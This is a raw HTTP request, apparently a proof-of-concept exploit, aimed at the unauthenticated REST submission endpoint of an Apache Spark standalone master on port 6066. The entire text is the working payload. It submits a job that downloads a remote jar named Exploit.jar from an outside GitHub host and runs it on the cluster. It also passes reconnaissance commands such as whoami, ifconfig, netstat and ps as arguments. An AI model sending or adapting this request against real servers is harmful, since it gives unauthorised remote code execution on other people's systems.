`POST /v1/submissions/create HTTP/1.1`
`Host: your-ip:6066`
`Accept-Encoding: gzip, deflate`
`Accept: */*`
`Accept-Language: en`
`User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)`
`Content-Type: application/json`
`Connection: close`
`Content-Length: 680`

`{`
  `"action": "CreateSubmissionRequest",`
  `"clientSparkVersion": "2.3.1",`
  `"appArgs": [`
    `"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"`
  `],`
  `"appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",`
  `"environmentVariables": {`
    `"SPARK_ENV_LOADED": "1"`
  `},`
  `"mainClass": "Exploit",`
  `"sparkProperties": {`
    `"spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",`
    `"spark.driver.supervise": "false",`
    `"spark.app.name": "Exploit",`
    `"spark.eventLog.enabled": "true",`
    `"spark.submit.deployMode": "cluster",`
    `"spark.master": "spark://your-ip:6066"`
  `}`
`}`